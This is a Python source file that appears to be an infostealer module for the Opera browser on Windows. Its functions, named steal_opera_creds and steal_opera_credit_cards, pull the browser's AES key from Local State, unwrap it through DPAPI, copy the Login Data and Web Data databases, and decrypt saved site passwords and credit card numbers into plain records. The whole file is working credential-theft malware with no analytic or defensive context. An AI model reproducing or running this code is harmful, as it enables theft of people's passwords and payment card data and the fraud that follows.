import os
import re
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil


__OPERA_LOCAL_STATE              = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable\Local State"%(os.environ['USERPROFILE']))
__OPERA_CREDS_ORIGINAL_FILE      = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable\Login Data"%(os.environ['USERPROFILE']))
__OPERA_CREDS_COPY_FILE          = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable\Login Data.bak"%(os.environ['USERPROFILE']))
__OPERA_CREDIT_CARDS_FILE        = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable\Web Data"%(os.environ['USERPROFILE']))
__OPERA_CREDIT_CARDS_COPY_FILE   = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable\Web Data.bak"%(os.environ['USERPROFILE']))


def __decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def __generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def __get_secret_key():
    try:
        with open(__OPERA_LOCAL_STATE, "r", encoding='utf-8') as f: #(1) Get secretkey from opera local state
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] #Remove suffix DPAPI
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None


def __decrypt_opera_encryption(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15] # Initialisation vector for AES decryption
        encrypted_password = ciphertext[15:-16] # Get encrypted password by removing suffix bytes (last 16 bits), encrypted password is 192 bits
        cipher = __generate_cipher(secret_key, initialisation_vector) # Build the cipher to decrypt the ciphertext
        decrypted_pass = __decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        return ""


def __copy_db_file(ORIGINAL_FILE, COPY_FILE):
    try:
        shutil.copyfile(ORIGINAL_FILE, COPY_FILE) # Copy file to prevent DB locking
    except Exception as e:
        print(e)


def __open_db_connection(FILE):
    try:
        con = sqlite3.connect(FILE) # Create an SQL connection to our SQLite database
        cur = con.cursor()
        return con, cur
    except Exception as e:
        print(e)
        return None


def __get_opera_creds(cur):
    secret_key = __get_secret_key() # Get secret key to decrypt opera passwords
    opera_creds = []
    for row in cur.execute("SELECT origin_url, username_value, password_value FROM logins"): # Get, decode and output SQLite DB values to other file
        origin_url, username, enc_password = row[0], row[1], row[2]

        if re.match(r"^android\:", origin_url): # remove unrelevent android data
            continue

        decrypted_password = __decrypt_opera_encryption(enc_password, secret_key)
        opera_creds.append({"origin_url": origin_url, "username": username, "password": decrypted_password})
    return opera_creds


def __get_opera_credit_cards(cur):
    secret_key = __get_secret_key() # Get secret key to decrypt opera passwords
    credit_cards = []

    for row in cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname FROM credit_cards"): # Get, decode and output SQLite DB values to other file
        name_on_card, expiration_month, expiration_year, card_number_encrypted = row[0], row[1], row[2], row[3]

        card_number_decrypted = __decrypt_opera_encryption(card_number_encrypted, secret_key)
        credit_cards.append({"name_on_card": name_on_card,
                            "expiration_month": expiration_month,
                            "expiration_year": expiration_year,
                            "card_number_decrypted": card_number_decrypted
                            })
    return credit_cards


def steal_opera_creds(): # get opera credentials
    try:
        __copy_db_file(__OPERA_CREDS_ORIGINAL_FILE, __OPERA_CREDS_COPY_FILE)
        con, cur = __open_db_connection(__OPERA_CREDS_COPY_FILE)
        opera_creds = __get_opera_creds(cur)
        con.close() # Close SQLite3 connection
    except:
        opera_creds = "[ERROR] Couldn't get opera creds"
    finally:
        return opera_creds


def steal_opera_credit_cards(): # get opera credit cards
    try:
        __copy_db_file(__OPERA_CREDIT_CARDS_FILE, __OPERA_CREDIT_CARDS_COPY_FILE)
        con, cur = __open_db_connection(__OPERA_CREDIT_CARDS_COPY_FILE)
        credit_cards = __get_opera_credit_cards(cur)
        con.close() # Close SQLite3 connection
    except:
        credit_cards = "[ERROR] Couldn't get opera credit cards"
    finally:
        return credit_cards